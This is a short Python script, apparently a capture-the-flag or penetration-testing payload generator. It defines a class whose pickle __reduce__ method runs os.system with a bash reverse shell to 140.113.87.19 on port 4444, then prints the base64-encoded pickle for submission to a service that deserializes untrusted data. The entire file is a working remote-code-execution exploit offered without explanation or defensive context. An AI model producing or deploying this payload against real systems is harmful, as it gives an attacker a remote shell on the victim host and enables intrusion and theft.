import os
import pickle
import sys
import base64

payload = 'bash -c \'bash -i >& /dev/tcp/140.113.87.19/4444 0>&1\''

class Exploit(object):
    def __reduce__(self):
        return (os.system, (payload,))

shellcode = pickle.dumps(Exploit())
result = base64.b64encode(shellcode).decode()

print(result)
